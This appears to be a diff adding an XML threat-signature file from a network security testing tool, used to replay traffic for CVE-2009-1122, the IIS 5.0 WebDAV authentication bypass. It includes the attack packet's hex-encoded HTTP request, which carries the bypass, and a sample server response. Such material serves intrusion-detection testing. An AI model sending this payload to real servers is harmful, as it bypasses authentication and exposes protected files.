@@ -1,0 +1,85 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Microsoft IIS 5.0 WebDav Request Directory Security Bypass"/>
+    <EngDesc display="true" value="A security bypass vulnerability exists in the Microsoft Internet Information Services (IIS) product. The vulnerability is due to the way IIS handles WebDAV requests for web pages requiring authentication. A remote attacker can exploit the vulnerability to bypass access restrictions on resources that require authentication. A successful attack attempt will allow the attacker to bypass security controls, upload or download arbitrary files to protected resources."/>
+    <Intent display="true">
+      <item value="Policy_Bypass/Design_Weakness"/>
+    </Intent>
+    <Protocol display="true" value="HTTP/HTTPS"/>
+    <Type_Of_Equipment display="true">
+      <item value="Server"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Microsoft"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Microsoft_Internet_Information_Services"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Microsoft_Internet_Information_Services_5.0"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value=""/>
+    <CVEID display="true" value="CVE-2009-1122"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value=""/>
+    <ID display="true" value="ccb618df72cc9aee5350e6556cd56daf"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="633976797298945308"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1261996247" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="K"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="L"/>
+  </Variables>
+  <Loops>
+    <for index="D">
+      <for index="K"/>
+      <for index="L"/>
+    </for>
+    <for index="E">
+      <for index="K"/>
+      <for index="L"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="D" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:0C:29:92:32:F4" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="012F" Identification="41A9" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="9625" srcIP="172.16.1.2" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="56932" destPort="$HTTPdestPort" SeqNumber="E9EA1D7F" AckNumber="8A8CA716" HeaderLength="08" WindowSize="002E" Checksum="5748" UrgentPointer="0000" Options="0101080A82FA5CDA00000000" Payload="504F5354202F25323525333725333025323525333725333225323525333625333925323525333725333625323525333625333125323525333725333425323525333625333525323525333225363625323525333725333025323525333725333225323525333625363625323525333725333425323525333625333525323525333625333325323525333725333425323525333625333525323525333625333425323525333225363525323525333625333125323525333725333325323525333725333025323530307075626C69632E6173705C2020485454502F312E310D0A49463A200D0A486F73743A203137322E31362E382E3231360D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="E" Count="">
+      <Ethernet srcMac="00:0C:29:92:32:F4" destMac="00:1B:78:75:79:68" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0193" Identification="2157" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="7613" srcIP="$destIP" destIP="172.16.1.2" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$HTTPdestPort" destPort="56932" SeqNumber="8A8CA716" AckNumber="E9EA1E7A" HeaderLength="08" WindowSize="FF04" Checksum="2C36" UrgentPointer="0000" Options="0101080A0003F85C82FA5CDA" Payload="485454502F312E3120323030204F4B0D0A5365727665723A204D6963726F736F66742D4949532F352E300D0A446174653A205475652C203136204A756E20323030392030353A32313A303920474D540D0A436F6E74656E742D4C656E6774683A203133310D0A436F6E74656E742D547970653A20746578742F68746D6C0D0A5365742D436F6F6B69653A2041535053455353494F4E494451535251514353413D45504A484F4747444748484A434F42414E4145454D4D4C4F3B20706174683D2F0D0A43616368652D636F6E74726F6C3A20707269766174650D0A0D0A3C68746D6C3E0D0A3C626F64793E0D0A20202054454C5553205365637572697479204C6162730D0A202020416C6C205269676874732052657365727665640D0A202020546869732070726F74656374656420636F6E74656E742072657175697265732061757468656E7469636174696F6E0D0A3C2F626F64793E0D0A3C2F68746D6C3E" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
